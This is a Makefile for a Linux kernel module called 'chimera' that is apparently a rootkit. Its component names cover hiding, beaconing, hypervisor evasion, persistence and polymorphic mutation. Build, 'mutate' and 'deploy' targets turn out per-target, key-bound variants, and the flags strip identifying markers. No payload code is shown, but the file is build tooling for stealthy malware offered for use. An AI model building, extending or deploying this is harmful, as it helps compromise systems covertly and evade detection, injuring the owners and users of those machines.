obj-m += chimera.o

chimera-objs := rk_core.o rk_hide.o rk_crypto.o rk_beacon.o \
                rk_hv_evasion.o rk_mem_guard.o rk_persist.o rk_polymorph.o

KDIR ?= /lib/modules/$(shell uname -r)/build
PWD  := $(shell pwd)

CCFLAGS := -O2 -fno-ident -fno-stack-protector -Wall
EXTRA_CFLAGS := $(CCFLAGS) -I$(PWD)/include

.PHONY: all clean mutate deploy

all: chimera.ko
    @echo "[+] Module built: chimera.ko"

chimera.ko: $(chimera-objs)
    $(MAKE) -C $(KDIR) M=$(PWD) modules

%.o: src/%.c include/chimera.h
    $(CC) $(EXTRA_CFLAGS) -c -o $@ $<

clean:
    $(MAKE) -C $(KDIR) M=$(PWD) clean
    rm -f *.o *.ko *.mod.c *.mod *.order .*.cmd
    rm -rf dist/
    rm -f src/rk_crypto_patched.c

mutate: chimera.ko
    @mkdir -p dist
    python3 tools/mutator.py \
        --target "$(TARGET)" \
        --rsa-pub "$(RSA_PUB)" \
        --ko chimera.ko \
        --output-dir dist

deploy: mutate
    @echo "[+] Deployment artifacts in dist/"
    @ls -la dist/
